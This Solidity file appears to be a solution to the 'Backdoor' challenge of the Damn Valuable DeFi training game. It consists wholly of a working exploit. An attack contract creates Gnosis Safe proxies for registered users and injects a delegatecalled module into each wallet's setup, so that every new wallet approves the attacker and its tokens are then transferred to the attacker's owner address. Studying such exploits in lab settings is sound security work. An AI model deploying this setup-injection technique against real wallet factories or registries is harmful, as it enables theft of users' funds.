// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./DamnValuableToken.sol";

contract AttackWallet {
    address public owner;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token,
        address[] memory users
    ) {
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;

        // Deploy module contract (this will enable us to approve us
        // for the tokens in the setup process)
        BackdoorModule abm = new BackdoorModule();

        // Setup module setup data
        string memory setupTokenSignature = "approve(address,address,uint256)";
        bytes memory setupData = abi.encodeWithSignature(
            setupTokenSignature,
            address(this),
            address(token),
            10 ether
        );
        // Loop each user
        for (uint256 i = 0; i < users.length; i++) {
            // Need to create a dynamically sized array for the user to meet signature req's
            address user = users[i];
            address[] memory target = new address[](1);
            target[0] = user;

            // Create ABI call for proxy
            string
                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory gnosisSetupData = abi.encodeWithSignature(
                signatureString,
                target,
                uint256(1),
                address(abm),
                setupData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            // Deploy the proxy with the malicious data in gnosisSetupData
            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    gnosisSetupData,
                    1337,
                    IProxyCreationCallback(walletRegistry)
                );

            // Proxy has approved our contract for transfer in the setup process
            DamnValuableToken(token).transferFrom(
                address(newProxy),
                owner,
                10 ether
            );
        }
    }
}

// Backdoor module contract that has to be deployed seperately so
// It is able to be called before the above contract's constructor is completed
// It is delegate called so we are not calling the token approval directly.
contract BackdoorModule {
    function approve(
        address approvalAddress,
        address token,
        uint256 amount
    ) public {
        DamnValuableToken(token).approve(approvalAddress, amount);
    }
}
